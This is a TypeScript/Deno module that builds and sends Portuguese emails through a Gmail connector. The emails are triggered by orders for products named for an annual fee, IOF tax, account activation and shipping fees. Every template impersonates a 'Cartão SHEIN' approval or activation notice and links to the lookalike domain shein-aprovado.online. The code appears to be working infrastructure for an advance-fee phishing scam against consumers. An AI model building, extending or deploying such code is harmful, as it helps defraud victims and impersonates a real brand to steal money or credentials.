// Email templates por produto (espelho do buildEmailContent do AdminOrders)
const TAXA_ANUAL = ["806f969c-7667-4d9d-8520-18579f3c772b"];
const IOF = ["3992d6d7-f608-4b8a-9191-c053eda9a673"];
const ATIVAR_CONTA = ["01ba9522-2107-4a64-9e39-53e782886996"];
const TAXAS_ENVIO = [
  "804a87c3-c43e-4173-b71c-069d83911bc8",
  "31ccbc66-dff2-4273-a3f1-d6e7858a2578",
  "4e1e0583-f0c9-47e9-8632-2e5c81a43518",
];

const TRIGGER_IDS = new Set([...TAXA_ANUAL, ...IOF, ...ATIVAR_CONTA, ...TAXAS_ENVIO]);

export function shouldSendOrderEmail(productIds: string[]): boolean {
  return productIds.some((id) => TRIGGER_IDS.has(id));
}

export function buildOrderEmail(order: any, productIds: string[]): { subject: string; body: string } {
  const firstName = (order.full_name || "").trim().split(" ")[0] || "";
  const has = (list: string[]) => productIds.some((id) => list.includes(id));

  if (has(TAXA_ANUAL)) {
    return {
      subject: "Seu Cartão SHEIN está disponível",
      body:
        `Olá, ${firstName}!\n\n` +
        "O acesso à sua conta e ao seu Cartão SHEIN já está disponível.\n\n" +
        "Para visualizar os dados da sua conta, acompanhar o status do cartão e acessar as funcionalidades liberadas, acesse o link abaixo:\n\n" +
        "https://shein-aprovado.online/liberado/banking\n\n" +
        "Recomendamos que realize o acesso o quanto antes para conferir todas as informações disponíveis em seu cadastro.\n\n" +
        "Caso precise de ajuda, estou à disposição.",
    };
  }
  if (has(IOF)) {
    return {
      subject: "Atualização sobre o seu Cartão SHEIN",
      body:
        `Olá, ${firstName}!\n\n` +
        "Temos uma atualização importante sobre o seu Cartão SHEIN.\n\n" +
        "Para consultar as informações mais recentes e dar continuidade ao processo de liberação, acesse o link abaixo:\n\n" +
        "https://shein-aprovado.online/liberado/up3\n\n" +
        "Após concluir esta etapa, você poderá acompanhar as próximas atualizações diretamente pelo sistema.\n\n" +
        "Qualquer dúvida, estou à disposição.",
    };
  }
  if (has(ATIVAR_CONTA)) {
    return {
      subject: "Nova etapa disponível no seu cadastro",
      body:
        `Olá, ${firstName}!\n\n` +
        "Seu cadastro recebeu uma atualização e uma nova etapa já está disponível para conclusão.\n\n" +
        "Acesse o link abaixo para verificar os detalhes e dar continuidade ao processo:\n\n" +
        "https://shein-aprovado.online/liberado/imposto\n\n" +
        "Recomendamos concluir esta etapa o quanto antes para evitar atrasos nas próximas atualizações.\n\n" +
        "Fico à disposição.",
    };
  }
  return {
    subject: "Seu cartão está aguardando ativação",
    body:
      `Olá, ${firstName}!\n\n` +
      "Seu cartão já está liberado e aguardando apenas a ativação final.\n\n" +
      "Para concluir o processo e liberar o acesso, acesse agora:\n\n" +
      "https://shein-aprovado.online/liberado/ativacao\n\n" +
      "A ativação leva apenas alguns minutos e, após a confirmação, seu cartão ficará disponível para uso.\n\n" +
      "Qualquer dúvida, estou à disposição.",
  };
}

function base64Url(input: string): string {
  const bytes = new TextEncoder().encode(input);
  let bin = "";
  bytes.forEach((b) => (bin += String.fromCharCode(b)));
  return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

export async function sendOrderEmailViaGmail(params: {
  to: string;
  subject: string;
  body: string;
}): Promise<void> {
  const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
  const GMAIL_KEY = Deno.env.get("GOOGLE_MAIL_API_KEY");
  if (!LOVABLE_API_KEY || !GMAIL_KEY) {
    console.warn("Gmail connector not configured, skipping email");
    return;
  }

  const rfc2822 = [
    `To: ${params.to}`,
    `Subject: =?UTF-8?B?${btoa(unescape(encodeURIComponent(params.subject)))}?=`,
    "MIME-Version: 1.0",
    'Content-Type: text/plain; charset="UTF-8"',
    "Content-Transfer-Encoding: 8bit",
    "",
    params.body,
  ].join("\r\n");

  const raw = base64Url(rfc2822);

  try {
    const res = await fetch(
      "https://connector-gateway.lovable.dev/google_mail/gmail/v1/users/me/messages/send",
      {
        method: "POST",
        headers: {
          Authorization: `Bearer ${LOVABLE_API_KEY}`,
          "X-Connection-Api-Key": GMAIL_KEY,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ raw }),
      }
    );
    const txt = await res.text();
    console.log(`Gmail send [${res.status}]:`, txt.slice(0, 500));
  } catch (err) {
    console.error("Gmail send error:", err);
  }
}